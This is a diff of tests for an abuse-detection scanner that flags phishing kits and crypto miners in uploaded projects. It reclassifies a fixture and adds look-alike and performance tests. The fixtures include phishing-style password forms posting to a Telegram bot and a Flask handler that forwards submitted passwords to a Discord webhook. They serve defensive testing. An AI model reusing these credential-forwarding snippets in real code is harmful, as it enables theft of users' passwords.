@@ -37,8 +37,6 @@ def scan(tmp_path, files: dict[str, str | bytes]) -> Verdict:
                               "<input type=password name=p></form>"}, P.PHISHING_KIT),
     ({"index.html": "<form><input type='password' name='p'></form><script>"
                     "fetch('https://api.telegram.org/bot123/sendMessage')</script>"}, P.PHISHING_KIT),
-    ({"app.py": FLASK + "import requests\n@app.post('/login')\ndef l():\n    p = request.form['password']\n"
-                "    requests.post('https://discord.com/api/webhooks/1/x', json={'p': p})\n"}, P.PHISHING_KIT),
 ])
 def test_high_confidence_markers_block(tmp_path, files, code):
     v = scan(tmp_path, files)
@@ -62,6 +60,10 @@ def test_high_confidence_markers_block(tmp_path, files, code):
      "prescreen_bulk_mail"),
     ({"login.html": "<h1>PayPal login</h1><form method=post action='/login'><input type=password></form>"},
      "prescreen_phishing_suspect"),
+    # Forwarding a submitted password to a webhook: a strike, not a refusal (code can't tell
+    # forwarding from reading; security review of #95).
+    ({"app.py": FLASK + "import requests\n@app.post('/login')\ndef l():\n    p = request.form['password']\n"
+                "    requests.post('https://discord.com/api/webhooks/1/x', json={'p': p})\n"}, "prescreen_phishing_suspect"),
 ])
 def test_low_confidence_markers_flag_without_blocking(tmp_path, files, signal):
     v = scan(tmp_path, files)
@@ -88,6 +90,14 @@ def test_low_confidence_markers_flag_without_blocking(tmp_path, files, signal):
     {"alert.py": "import requests\nrequests.post('https://hooks.slack.com/services/T/B/X', json={'text': 'deploy done'})\n"},
     # docs mentioning words near the patterns
     {"README.md": "We protect against DDoS and mining abuse. Our scanner page lists ports.\n"},
+    # security review of #95: a Flask app posting to Slack, reading request.json near Python's `pass`
+    {"app.py": "from flask import Flask, request\nimport requests\napp = Flask(__name__)\n@app.post('/notify')\n"
+               "def notify():\n    data = request.json\n    if not data:\n        pass\n"
+               "    requests.post('https://hooks.slack.com/services/T/B/X', json={'text': data.get('msg')})\n"
+               "    return 'ok'\n"},
+    # ...and the same with a Discord webhook and a password-reset message (no password read)
+    {"app.py": FLASK + "import requests\n@app.post('/reset')\ndef r():\n    body = request.get_json()\n    pass\n"
+               "    requests.post('https://discord.com/api/webhooks/1/x', json={'content': 'password reset requested'})\n"},
 ])
 def test_benign_look_alikes_are_clean(tmp_path, files):
     v = scan(tmp_path, files)
@@ -110,3 +120,33 @@ def test_abuse_refused_carries_the_codes(tmp_path):
     e = AbuseRefused(v)
     assert e.codes == ["crypto_miner"] and "crypto_miner" in str(e)
     assert v.signals == ["prescreen_network_scanner"]
+
+
+
+# --- cost: bounded regexes, byte and time budgets (security review of #95) ----------------------
+
+def test_pathological_html_finishes_quickly(tmp_path):
+    """Unclosed tags made the old unbounded [^>]* scans quadratic: ~3.5 s per 140 KB, minutes per MB."""
+    import time
+    scan(tmp_path, {"a.html": "<input " * 36000, "b.html": "<form " * 42000,
+                    "c.html": "<input type=password " + "<form action=x " * 20000,
+                    "d.py": "subprocess.run(" + "x" * 200_000, "e.txt": "a." * 120_000})
+    t = time.perf_counter()
+    v = prescreen(tmp_path)
+    assert time.perf_counter() - t < 2.0 and not v.blocked
+
+
+def test_byte_and_time_budgets_mark_the_verdict_incomplete(tmp_path, monkeypatch):
+    import sys
+    m = sys.modules["shipcube_profiler.prescreen"]
+    for i in range(5):
+        (tmp_path / f"f{i}.py").write_text("x = 1\n" * 1000)
+    (tmp_path / "xmrig").write_bytes(b"x")                    # file names are still checked
+    monkeypatch.setattr(m.P, "MAX_TOTAL_TEXT_BYTES", 10_000)
+    v = prescreen(tmp_path)
+    assert v.incomplete and v.to_dict()["incomplete"] and v.blocked
+    monkeypatch.setattr(m.P, "MAX_TOTAL_TEXT_BYTES", 8_000_000)
+    monkeypatch.setattr(m.P, "MAX_SECONDS", 0.0)
+    assert prescreen(tmp_path).incomplete
+    monkeypatch.setattr(m.P, "MAX_SECONDS", 5.0)
+    assert not prescreen(tmp_path).incomplete
